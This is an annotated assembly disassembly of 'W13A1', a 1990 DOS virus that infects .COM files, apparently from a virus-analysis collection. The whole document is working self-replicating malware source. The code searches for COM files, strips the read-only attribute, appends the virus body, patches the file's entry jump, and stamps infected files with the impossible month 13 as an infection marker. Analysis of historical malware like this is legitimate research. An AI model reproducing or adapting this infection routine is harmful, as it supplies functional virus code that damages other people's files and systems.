

; Minor modyfication of W13-A, this one will be called W13A1
; Wirus founded in Warsaw on late September 1990
; This copy I have got from Marek Sell

0100 E9FD00        JMP     0200      ; beginning of the program

0200 50            PUSH    AX        ; virus start here
0200 50            PUSH    AX
0201 BE6503        MOV     SI,0365   ; base of working area
0204 8BD6          MOV     DX,SI
0206 81C60000      ADD     SI,0000
020A FC            CLD
020B B90300        MOV     CX,0003   ; restore 3 oryginal bytes of the file
020E BF0001        MOV     DI,0100
0211 F3            REPZ
0212 A4            MOVSB
0213 8BFA          MOV     DI,DX
0215 B430          MOV     AH,30     ; get DOS version
0217 CD21          INT     21

0219 3C00          CMP     AL,00     ; below 2.0?

021B 7503          JNZ     0220      ; no

021D E93F01        JMP     035F      ; exit

0220 BA2C00        MOV     DX,002C
0223 03D7          ADD     DX,DI
0225 8BDA          MOV     BX,DX     ; addres of new DTA
0227 B41A          MOV     AH,1A     ; set DTA
0229 CD21          INT     21

022B BD0000        MOV     BP,0000
022E 8BD7          MOV     DX,DI     ; base of working area
0230 81C20700      ADD     DX,0007   ; file name: \x.COM
0234 B90300        MOV     CX,0003   ; attributes: Read Only, Hiden
0237 B44E          MOV     AH,4E     ; find first
0239 CD21          INT     21

023B E90400        JMP     0242

023E B44F          MOV     AH,4F     ; find next
0240 CD21          INT     21

0242 7315          JAE     0259      ; file founded

0244 3C12          CMP     AL,12     ; error code: no more files?
0246 7403          JZ      024B

0248 E90D01        JMP     0358

024B 83FDFF        CMP     BP,-01

024E 7503          JNZ     0253

0250 E90501        JMP     0358

0253 4A            DEC     DX
0254 BDFFFF        MOV     BP,FFFF
0257 EBDB          JMP     0234

0259 8B4F18        MOV     CX,[BX+18]  ; file date
025C 81E1E001      AND     CX,01E0     ; cut mounth
0260 81F9A001      CMP     CX,01A0     ; equol 13?

0264 74D8          JZ      023E        ; yes, fing next

0266 817F1A00FA    CMP     WORD PTR [BX+1A],FA00  ; maximum file size 64000

026B 77D1          JA      023E

026D 817F1A0001    CMP     WORD PTR [BX+1A],0100  ; minimum file size 256

0272 72CA          JB      023E

0274 57            PUSH    DI          ; store DTA address
0275 8BF3          MOV     SI,BX
0277 83C61E        ADD     SI,+1E     ; file mame
027A 81C71400      ADD     DI,0014    ; addres of own buffer
027E 83FDFF        CMP     BP,-01

0281 7503          JNZ     0286

0283 B05C          MOV     AL,5C       ; '\' main directory
0285 AA            STOSB

0286 AC            LODSB
0287 AA            STOSB
0288 3C00          CMP     AL,00       ; end of string?
028A 75FA          JNZ     0286        ; not yet

028C 5F            POP     DI          ; restore DTA address
028D 8BD7          MOV     DX,DI
028F 81C21400      ADD     DX,0014     ; file name address
0293 B80043        MOV     AX,4300     ; get file attributes
0296 CD21          INT     21

0298 898D2200      MOV     [DI+0022],CX ; store attributes
029C 81E1FEFF      AND     CX,FFFE     ; reset Read Only
02A0 8BD7          MOV     DX,DI
02A2 81C21400      ADD     DX,0014
02A6 B80143        MOV     AX,4301     ; set file attribute
02A9 CD21          INT     21

02AB 8BD7          MOV     DX,DI       ; file name address
02AD 81C21400      ADD     DX,0014
02B1 B8023D        MOV     AX,3D02     ; open file for read/write
02B4 CD21          INT     21

02B6 7303          JAE     02BB

02B8 E99400        JMP     034F

02BB 8BD8          MOV     BX,AX      ; store handle in BX
02BD B80057        MOV     AX,5700    ; get file date/time stamp
02C0 CD21          INT     21

02C2 898D2400      MOV     [DI+0024],CX  ; store time
02C6 89952600      MOV     [DI+0026],DX  ; store date
02CA B43F          MOV     AH,3F      ; read file 
02CC B90300        MOV     CX,0003    ; number of bytes
02CF 8BD7          MOV     DX,DI      ; buffer
02D1 81C20000      ADD     DX,0000    ; clear carry
02D5 CD21          INT     21

02D7 7303          JAE     02DC

02D9 E95A00        JMP     0336

02DC 3D0300        CMP     AX,0003     ; test how many bytes were read

02DF 7555          JNZ     0336

02E1 B80242        MOV     AX,4202     ; move file pointer to the end
02E4 B90000        MOV     CX,0000
02E7 8BD1          MOV     DX,CX       ; to the end of file
02E9 CD21          INT     21

02EB 2D0300        SUB     AX,0003     ; virus offset in infected file
02EE 89850400      MOV     [DI+0004],AX  ; store
02F2 B96501        MOV     CX,0165
02F5 83FA00        CMP     DX,+00
02F8 753C          JNZ     0336

02FA 8BD7          MOV     DX,DI
02FC 2BF9          SUB     DI,CX
02FE 83C702        ADD     DI,+02
0301 050301        ADD     AX,0103
0304 03C1          ADD     AX,CX
0306 8905          MOV     [DI],AX
0308 B440          MOV     AH,40        ; write file
030A 8BFA          MOV     DI,DX        ; buffer
030C 2BD1          SUB     DX,CX
030E B91602        MOV     CX,0216      ; virus size
0311 CD21          INT     21

0313 7303          JAE     0318

0315 E91E00        JMP     0336

0318 3D1602        CMP     AX,0216     ; test how many bytes were read
031B 7519          JNZ     0336

031D B80042        MOV     AX,4200     ; mowe file pointer to the beginning 
0320 B90000        MOV     CX,0000
0323 8BD1          MOV     DX,CX
0325 CD21          INT     21

0327 720D          JB      0336

0329 B440          MOV     AH,40        ; write file
032B B90300        MOV     CX,0003
032E 8BD7          MOV     DX,DI
0330 81C20300      ADD     DX,0003
0334 CD21          INT     21

0336 8B8D2400      MOV     CX,[DI+0024] ; restore time
033A 8B952600      MOV     DX,[DI+0026] ; restore date
033E 81E21FFE      AND     DX,FE1F      ; clear mounth number
0342 81CAA001      OR      DX,01A0      ; set mounth number to 13
0346 B80157        MOV     AX,5701      ; set file date/time stamp
0349 CD21          INT     21

034B B43E          MOV     AH,3E       ; close file
034D CD21          INT     21

; common mistake for this virus family, should be MOV  AX,4301

034F B80043        MOV     AX,4300     ; get file attribute
0352 8B8D2200      MOV     CX,[DI+0022]
0356 CD21          INT     21

0358 BA8000        MOV     DX,0080     ; restore DTA
035B B41A          MOV     AH,1A
035D CD21          INT     21

; go back to the program

035F 58            POP     AX
0360 BF0001        MOV     DI,0100
0363 57            PUSH    DI
0364 C3            RET

0365  BB 82 00    ; oryginal 3 starting bytes
0368  E9 FD 00    ; new 3 starting bytes
036B  5C          ; character '\'

; in oryginal here is string ????????.COM

036C  78 2E 43 4F 4D 00 46 4C 2E 43 4F 4D 00  ; x.COM.FL.COM. file name to found
0379  58 2E 43 4F 4D 00 00 20 00 5C 30 59 0B 00   X.COM..   ; founded file name
0387  20 00       ; file attribute
0389  65 0E       ; file time
038B  21 00       ; file date

038D  3F 3F 3F 3F ; ???? 

; new DTA

0391  03 
0392  58 20 20 20 20 20 20 20  ; file name   X
039A  43 4F 4D                 ; extension   COM
039D  03 07 00 7C 2F 00 00 00 00  ; reserved for DOS (previous 21 bytes)
03A6  20                       ; file attribute
03A7  65 0E                    ; file time
03A9  21 00                    ; file date
03AB  00 01 00 00              ; file size
03AF  58 2E 43 4F 4D 00 20 20 6F 66 74 79 72 ;         X.COM.  oftyr

; unused garbage

03BC                                      69 67 68 74               ight
03C0  20 4D 69 63 72 6F 73 6F 66 74 79 72 69 67 68 74    Microsoftyright
03D0  20 4D 69 63 72 6F 73 6F 66 74 79 72 69 67 68 74    Microsoftyright
03E0  20 4D 69 63 72 6F 73 6F 66 74 79 72 69 67 68 74    Microsoftyright
03F0  20 4D 69 63 72 6F 73 6F 66 74 79 72 69 67 68 74    Microsoftyright
0400  20 4D 69 63 72 6F 73 6F 66 74 20 31 39 38 38 6D    Microsoft 1988m
0410  65 20 00 BE 3A 43 72                               e .>:Cr         


